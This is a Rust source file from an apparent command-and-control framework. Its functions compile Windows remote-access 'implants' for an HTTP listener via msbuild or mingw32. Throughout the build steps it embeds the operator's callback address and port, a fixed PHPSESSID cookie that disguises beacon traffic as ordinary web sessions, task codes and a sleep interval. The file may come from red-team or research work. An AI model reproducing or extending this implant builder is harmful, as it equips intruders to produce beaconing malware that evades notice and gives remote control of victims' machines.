use lazy_static::lazy_static;
use std::path::{Ancestors, Path, PathBuf};
use std::process::{Command, Stdio};

use crate::{models::HTTPListener, settings};

lazy_static! {
    static ref CONFIG: settings::Settings = settings::Settings::new();
}

#[cfg(target_os = "windows")]
fn compile_msbuild_project(
    http_listener: HTTPListener,
    implant_project_path: PathBuf,
    output_directory_path: PathBuf,
) -> bool {
    let output_directory_path_str_result = output_directory_path.to_str();
    if output_directory_path_str_result.is_none() {
        return false;
    }

    match implant_project_path.as_path().to_str() {
        Some(implant_project_path_str) => {
            match Command::new(&CONFIG.binaries.vcvarsall)
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .arg("amd64_x86")
                .arg("&&")
                .arg("msbuild")
                .arg(implant_project_path_str)
                .arg("/p:configuration=Release")
                .arg("/p:Platform=x64")
                .arg("/p:DebugSymbols=false")
                .arg("/p:DebugType=none")
                .arg(format!(
                    "/p:OutDir={}",
                    output_directory_path_str_result.unwrap()
                ))
                .env("ImplantRemoteHost", http_listener.address.to_string())
                .env("ImplantHttpHost", http_listener.host)
                .env("ImplantHttpPort", http_listener.port.to_string())
                .env("ImplantHttpCookieName", "PHPSESSID")
                .env("ImplantHttpCookieValue", "8130ce092704ef058705095d9a610c06")
                .env("ImplantHttpProtoVer", "1.1")
                .env("ImplantHttpGetPage", &CONFIG.listener.http.pull_endpoint)
                .env("ImplantHttpPostPage", &CONFIG.listener.http.pull_endpoint)
                .env(
                    "ImplantCommandWhoami",
                    CONFIG.implant.tasks.commands[0].code.to_string(),
                )
                .env(
                    "ImplantCommandPwd",
                    CONFIG.implant.tasks.commands[1].code.to_string(),
                )
                .env("ImplantSleepSeconds", CONFIG.implant.sleep.to_string())
                .status()
            {
                Ok(_) => {
                    println!("[+] Successfully compiled the implant project with msbuild");
                    return true;
                }
                Err(_) => {
                    println!("[!] Failed to generate the implant");
                }
            }
        }
        None => {}
    }

    return false;
}

#[cfg(target_os = "linux")]
fn compile_mingw32_project(
    http_listener: HTTPListener,
    main_file_path: PathBuf,
    output_directory_path: PathBuf,
) -> bool {
    use std::fs;

    let output_directory_path_str_option = output_directory_path.to_str();
    if output_directory_path_str_option.is_none() {
        return false;
    }

    // delete output file if existing
    let output_file_pathbuf = output_directory_path.join("implant.exe");
    if output_file_pathbuf.exists()
    {
        match fs::remove_file(output_file_pathbuf.clone())
        {
            Ok(_) => {
                println!("[+] Removed existing implant executable");
            },
            Err(_) => {},
        }
    }

    let output_file_path: &str;
    match output_file_pathbuf.as_path().to_str()
    {
        Some(v) => {
            output_file_path = v;
        },
        None => todo!(),
    }

    match main_file_path.as_path().to_str() {
        Some(implant_project_path_str) => {
            match Command::new("/usr/bin/x86_64-w64-mingw32-gcc")
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .arg("-o")
                .arg(output_file_path)
                .arg(implant_project_path_str)
                .arg("-static")
                .arg("-lws2_32")
                .arg("-lstdc++")
                .arg("-D_DEBUG")
                .arg(format!("-DHTTP_PORT={}", http_listener.port))
                .arg(format!(
                    "-DCOMMAND_WHOAMI={}",
                    CONFIG.implant.tasks.commands[0].code
                ))
                .arg(format!(
                    "-DCOMMAND_PWD={}",
                    CONFIG.implant.tasks.commands[1].code
                ))
                .status()
            {
                Ok(_) => {
                    println!("[+] Successfully compiled the implant project with mingw32");
                    return true;
                }
                Err(_) => {
                    println!("[!] Failed to generate the implant");
                }
            }
        }
        None => {}
    }

    return false;
}

#[cfg(target_os = "windows")]
pub fn generate_http_implant(http_listener: HTTPListener, implant_project_name: &str) -> bool {
    if CONFIG.binaries.vcvarsall.is_empty() {
        return false;
    }

    println!(
        "[+] Generating executable for HTTP listener on port {}",
        http_listener.port
    );

    let current_path_result: Result<PathBuf, std::io::Error> = std::env::current_exe();
    if current_path_result.is_err() {
        println!("[!] Couldn't get the current path of the executable");
        return false;
    }

    let current_path: PathBuf = current_path_result.unwrap();
    let mut current_path_ancestors: Ancestors = current_path.ancestors();

    // climb up from the /code/target/release/rusty_c2.exe to /code/
    current_path_ancestors.next();
    current_path_ancestors.next();
    current_path_ancestors.next();

    let implant_project_path: Option<&Path> = current_path_ancestors.next();

    if implant_project_path.is_none() {
        println!("[!] Couldn't find the path of the implant projects");
        return false;
    }

    let output_directory_path: PathBuf = implant_project_path.unwrap().join("output");

    match std::fs::read_dir(implant_project_path.unwrap().join("implants").join("http")) {
        Ok(implant_projects_dir) => {
            for entry_result in implant_projects_dir {
                match entry_result {
                    Ok(entry) => match entry.file_type() {
                        Ok(entry_file_type) => {
                            if entry_file_type.is_dir() {
                                if entry.file_name().to_ascii_lowercase() == implant_project_name {
                                    println!("[+] Found implant project: {}", implant_project_name);
                                    match entry.path().to_str() {
                                        Some(implant_project_path) => {
                                            println!(
                                                "[+] Found path of the implant project: {}",
                                                implant_project_path
                                            );

                                            compile_msbuild_project(
                                                http_listener,
                                                entry.path(),
                                                output_directory_path,
                                            );
                                            return true;
                                        }
                                        None => {
                                            println!("[!] Couldn't find the path of the implant projects");
                                        }
                                    }
                                }
                            }
                        }
                        Err(_) => {}
                    },
                    Err(_) => {}
                }
            }

            println!("[!] Couldn't find the implant project");
        }
        Err(_) => {
            println!("[!] Couldn't list the implant projects");
        }
    };

    return true;
}

#[cfg(target_os = "linux")]
pub fn generate_http_implant(http_listener: HTTPListener, implant_project_name: &str) -> bool {
    use std::str::FromStr;

    let flag: bool = false;

    println!(
        "[+] Generating executable for HTTP listener on port {}",
        http_listener.port
    );

    let tmp_result = PathBuf::from_str("/tmp/");
    let tmp_out_dir: PathBuf;
    match tmp_result {
        Ok(v) => {
            tmp_out_dir = v;
        }
        Err(_) => return flag,
    }

    let current_path_result: Result<PathBuf, std::io::Error> = std::env::current_exe();
    if current_path_result.is_err() {
        println!("[!] Couldn't get the current path of the executable");
        return false;
    }

    let current_path: PathBuf = current_path_result.unwrap();
    let mut current_path_ancestors: Ancestors = current_path.ancestors();

    // climb up from the /code/target/release/rusty_c2.exe to /code/
    current_path_ancestors.next();
    current_path_ancestors.next();
    current_path_ancestors.next();

    let implant_project_path: Option<&Path> = current_path_ancestors.next();

    if implant_project_path.is_none() {
        println!("[!] Couldn't find the path of the implant projects");
        return false;
    }

    match std::fs::read_dir(implant_project_path.unwrap().join("implants").join("http")) {
        Ok(implant_projects_dir) => {
            for entry_result in implant_projects_dir {
                match entry_result {
                    Ok(entry) => match entry.file_type() {
                        Ok(entry_file_type) => {
                            if entry_file_type.is_dir() {
                                if entry.file_name().to_ascii_lowercase() == implant_project_name {
                                    println!("[+] Found implant project: {}", implant_project_name);
                                    match entry.path().to_str() {
                                        Some(implant_project_path) => {
                                            println!(
                                                "[+] Found path of the implant project: {}",
                                                implant_project_path
                                            );

                                            compile_mingw32_project(
                                                http_listener,
                                                entry.path().join("main.cpp"),
                                                tmp_out_dir,
                                            );
                                            return true;
                                        }
                                        None => {
                                            println!("[!] Couldn't find the path of the implant projects");
                                        }
                                    }
                                }
                            }
                        }
                        Err(_) => {}
                    },
                    Err(_) => {}
                }
            }

            println!("[!] Couldn't find the implant project");
        }
        Err(_) => {
            println!("[!] Couldn't list the implant projects");
        }
    };

    return flag;
}

pub fn list_http_implants(output_implant_projects: &mut Vec<String>) -> bool {
    let current_path_result: Result<PathBuf, std::io::Error> = std::env::current_exe();
    if current_path_result.is_err() {
        println!("[!] Couldn't get the current path of the executable");
        return false;
    }

    let current_path: PathBuf = current_path_result.unwrap();
    let mut current_path_ancestors: Ancestors = current_path.ancestors();

    // climb up from the /code/target/release/rusty_c2.exe to /code/
    current_path_ancestors.next();
    current_path_ancestors.next();
    current_path_ancestors.next();

    let implant_project_path: Option<&Path> = current_path_ancestors.next();

    if implant_project_path.is_none() {
        println!("[!] Couldn't find the path of the implant projects");
        return false;
    }

    match std::fs::read_dir(implant_project_path.unwrap().join("implants").join("http")) {
        Ok(implant_projects_dir) => {
            for entry_result in implant_projects_dir {
                match entry_result {
                    Ok(entry) => match entry.file_type() {
                        Ok(entry_file_type) => {
                            if entry_file_type.is_dir() && entry.file_name().to_str().is_some() {
                                output_implant_projects
                                    .push(String::from(entry.file_name().to_str().unwrap()));
                            }
                        }
                        Err(_) => {}
                    },
                    Err(_) => {}
                }
            }
        }
        Err(_) => {
            println!("[!] Couldn't list the implant projects");
        }
    };

    return true;
}
